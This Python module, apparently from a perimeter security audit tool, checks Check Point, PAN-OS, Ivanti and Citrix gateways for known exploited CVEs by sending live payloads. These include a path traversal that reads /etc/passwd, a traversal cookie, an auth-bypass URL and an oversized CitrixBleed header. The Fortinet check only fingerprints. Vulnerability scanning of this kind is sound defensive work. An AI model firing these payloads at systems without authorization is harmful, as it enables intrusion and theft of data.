"""
Raw execution for perimeter_gateway_probe.
Probes enterprise perimeter devices and SSL-VPN gateways for critical known
exploited vulnerabilities:
- Check Point Quantum Security Gateway (CVE-2024-24919 arbitrary file read)
- Palo Alto PAN-OS GlobalProtect (CVE-2024-3400 command injection & portal exposure)
- Ivanti Connect Secure / Policy Secure (CVE-2023-46805 & CVE-2024-21887 auth bypass)
- Citrix NetScaler ADC / Gateway (CVE-2023-4966 CitrixBleed & gateway exposure)
- Fortinet FortiGate SSL-VPN (CVE-2022-42475, CVE-2023-27997, CVE-2024-21762) --
  fingerprint only, see probe_fortinet's docstring for why this one differs
  from the other four.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0 (Perimeter Security Audit)"


@dataclass
class ApplianceProbeResult:
    appliance: str
    target_url: str
    fingerprinted: bool = False
    vulnerable: bool = False
    # True only for probers (currently just Fortinet) whose CVEs are unsafe
    # to actively trigger, so fingerprinted=True here never implies a tested
    # exploit path returned safe -- it means exposure was confirmed and the
    # actual CVE status still needs checking by some other means (firmware
    # version, vendor advisory, authenticated access).
    requires_manual_verification: bool = False
    cve: str = ""
    evidence_snippet: str = ""
    status_code: Optional[int] = None
    error: Optional[str] = None


@dataclass
class RawPerimeterResult:
    target: str = ""
    base_url: str = ""
    results: List[ApplianceProbeResult] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    t = target.strip()
    if not t.startswith("http://") and not t.startswith("https://"):
        t = f"https://{t}"
    return t.rstrip("/")


def probe_checkpoint(session: requests.Session, base_url: str, timeout: int) -> ApplianceProbeResult:
    res = ApplianceProbeResult(
        appliance="checkpoint",
        target_url=f"{base_url}/clients/MyCRL",
        cve="CVE-2024-24919",
    )
    try:
        url = f"{base_url}/clients/MyCRL"
        data = "aCSHELL/../../../../../../../../../../../etc/passwd"
        headers = {"Connection": "keep-alive"}

        resp = session.post(url, data=data, headers=headers, timeout=timeout, verify=False)
        res.status_code = resp.status_code
        text = resp.text or ""

        if "root:" in text and ":0:0:" in text:
            res.fingerprinted = True
            res.vulnerable = True
            res.evidence_snippet = text[:500]
        elif "admin:" in text or "/bin/bash" in text or "/bin/sh" in text:
            res.fingerprinted = True
            res.vulnerable = True
            res.evidence_snippet = text[:500]
        else:
            check_resp = session.get(f"{base_url}/", timeout=timeout, verify=False)
            if "Check Point" in check_resp.text or "Check Point" in str(check_resp.headers):
                res.fingerprinted = True

    except requests.exceptions.RequestException as e:
        res.error = str(e)

    return res


def probe_paloalto(session: requests.Session, base_url: str, timeout: int) -> ApplianceProbeResult:
    res = ApplianceProbeResult(
        appliance="paloalto",
        target_url=f"{base_url}/ssl-vpn/hipreport.esp",
        cve="CVE-2024-3400",
    )
    try:
        # Step 1: Fingerprint GlobalProtect portal
        login_url = f"{base_url}/global-protect/login.esp"
        login_resp = session.get(login_url, timeout=timeout, verify=False)
        if "GlobalProtect" in login_resp.text or "PAN-OS" in login_resp.text or "portal login" in login_resp.text.lower():
            res.fingerprinted = True

        # Step 2: Check for vulnerable telemetry endpoint handling
        hip_url = f"{base_url}/ssl-vpn/hipreport.esp"
        headers = {
            "Cookie": "SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/tradecraft_probe_cve3400;",
            "Connection": "close",
        }
        hip_resp = session.post(hip_url, headers=headers, timeout=timeout, verify=False)
        res.status_code = hip_resp.status_code
        hip_text = hip_resp.text or ""

        # When hipreport.esp responds with HTTP 200 or 403 on PAN-OS with device telemetry active:
        if res.fingerprinted and hip_resp.status_code == 200 and ("success" in hip_text.lower() or len(hip_text) == 0):
            res.vulnerable = True
            res.evidence_snippet = f"hipreport.esp returned HTTP 200 to SESSID traversal payload: {hip_text[:200]}"
        elif res.fingerprinted:
            res.evidence_snippet = f"GlobalProtect portal active; hipreport status code: {hip_resp.status_code}"

    except requests.exceptions.RequestException as e:
        res.error = str(e)

    return res


def probe_ivanti(session: requests.Session, base_url: str, timeout: int) -> ApplianceProbeResult:
    res = ApplianceProbeResult(
        appliance="ivanti",
        target_url=f"{base_url}/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
        cve="CVE-2023-46805, CVE-2024-21887",
    )
    try:
        # Step 1: Fingerprint Ivanti / Pulse Secure
        fp_resp = session.get(f"{base_url}/dana-na/auth/url_default/welcome.cgi", timeout=timeout, verify=False)
        if "Pulse Secure" in fp_resp.text or "Ivanti" in fp_resp.text or "DSID" in str(fp_resp.headers):
            res.fingerprinted = True

        # Step 2: Test API path traversal auth bypass
        bypass_url = f"{base_url}/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection"
        test_resp = session.get(bypass_url, timeout=timeout, verify=False)
        res.status_code = test_resp.status_code
        text = test_resp.text or ""

        # A vulnerable Ivanti endpoint returns 200 or 400 (Bad Request on payload parsing) instead of 403/Login redirect
        if test_resp.status_code in (200, 400) and ("system" in text.lower() or "error" in text.lower() or "cloud-server" in text.lower()):
            res.vulnerable = True
            res.fingerprinted = True
            res.evidence_snippet = f"Auth bypass path traversal returned HTTP {test_resp.status_code}: {text[:300]}"
        elif res.fingerprinted:
            res.evidence_snippet = f"Ivanti/Pulse Secure detected on target; bypass endpoint returned HTTP {test_resp.status_code}"

    except requests.exceptions.RequestException as e:
        res.error = str(e)

    return res


def probe_citrix(session: requests.Session, base_url: str, timeout: int) -> ApplianceProbeResult:
    res = ApplianceProbeResult(
        appliance="citrix",
        target_url=f"{base_url}/oauth/idp/.well-known/openid-configuration",
        cve="CVE-2023-4966",
    )
    try:
        # Step 1: Fingerprint Citrix Gateway / NetScaler
        vpn_resp = session.get(f"{base_url}/vpn/index.html", timeout=timeout, verify=False)
        if "Citrix" in vpn_resp.text or "Citrix" in str(vpn_resp.headers) or "NSC_" in str(vpn_resp.headers):
            res.fingerprinted = True

        # Step 2: Test CitrixBleed (CVE-2023-4966) endpoint with oversized Host header
        bleed_url = f"{base_url}/oauth/idp/.well-known/openid-configuration"
        large_host = "a" * 24812
        headers = {"Host": large_host, "Connection": "close"}

        bleed_resp = session.get(bleed_url, headers=headers, timeout=timeout, verify=False)
        res.status_code = bleed_resp.status_code
        text = bleed_resp.text or ""

        if bleed_resp.status_code == 200 and ("openid-configuration" in text or "issuer" in text) and len(text) > 1000:
            res.vulnerable = True
            res.fingerprinted = True
            res.evidence_snippet = f"CitrixBleed endpoint returned leaked buffer with HTTP 200 (length: {len(text)})"
        elif res.fingerprinted:
            res.evidence_snippet = f"Citrix NetScaler detected on target; bleed endpoint returned HTTP {bleed_resp.status_code}"

    except requests.exceptions.RequestException as e:
        res.error = str(e)

    return res


def probe_fortinet(session: requests.Session, base_url: str, timeout: int) -> ApplianceProbeResult:
    """Fingerprints a Fortinet FortiGate SSL-VPN portal. Deliberately does
    NOT attempt CVE-2022-42475 / CVE-2023-27997 / CVE-2024-21762: each is a
    pre-auth heap/stack memory-corruption bug in the SSL-VPN daemon, not a
    logic bug like the other four vendors' CVEs here. Sending a crafted
    trigger payload risks crashing the daemon -- a real availability
    impact -- while adding no evidence beyond what the fingerprint alone
    already shows (these builds are mass-exploited in the wild; the
    fingerprint itself is the actionable signal). `vulnerable` is never set
    true by this prober; `requires_manual_verification` is set instead."""
    res = ApplianceProbeResult(
        appliance="fortinet",
        target_url=f"{base_url}/remote/login",
        cve="CVE-2022-42475, CVE-2023-27997, CVE-2024-21762",
    )
    try:
        resp = session.get(f"{base_url}/remote/login", timeout=timeout, verify=False)
        res.status_code = resp.status_code
        text = resp.text or ""
        headers_str = str(resp.headers)

        if "SVPNCOOKIE" in headers_str or "sslvpn_login" in text.lower() or "fortinet" in text.lower():
            res.fingerprinted = True
            res.requires_manual_verification = True
            res.evidence_snippet = (
                "Fortinet FortiGate SSL-VPN portal detected at /remote/login. Not "
                "tested further: CVE-2022-42475, CVE-2023-27997, and CVE-2024-21762 "
                "are pre-auth memory-corruption bugs in the SSL-VPN daemon, unsafe to "
                "actively trigger without risking a crash. Treat any internet-reachable "
                "FortiGate SSL-VPN portal as a critical asset and confirm its FortiOS "
                "build against Fortinet's advisories (FG-IR-22-398, FG-IR-23-097, "
                "FG-IR-24-015) through an authenticated or vendor-provided channel."
            )

    except requests.exceptions.RequestException as e:
        res.error = str(e)

    return res


def get_probers() -> Dict[str, Any]:
    return {
        "checkpoint": probe_checkpoint,
        "paloalto": probe_paloalto,
        "ivanti": probe_ivanti,
        "citrix": probe_citrix,
        "fortinet": probe_fortinet,
    }


def execute(
    target: str,
    appliance: Optional[str] = "all",
    timeout: int = 8,
) -> RawPerimeterResult:
    if requests is None:
        return RawPerimeterResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawPerimeterResult(target="", error="target is required")

    base_url = normalize_target_url(target)
    result = RawPerimeterResult(target=target.strip(), base_url=base_url)

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    probers = get_probers()
    appliance_key = appliance.strip().lower() if appliance else "all"
    if appliance_key == "all":
        keys_to_probe = ["checkpoint", "paloalto", "ivanti", "citrix", "fortinet"]
    elif appliance_key in probers:
        keys_to_probe = [appliance_key]
    else:
        keys_to_probe = ["checkpoint", "paloalto", "ivanti", "citrix", "fortinet"]

    for k in keys_to_probe:
        prober_func = probers.get(k)
        if prober_func:
            probe_res = prober_func(session, base_url, timeout)
            result.results.append(probe_res)

    return result
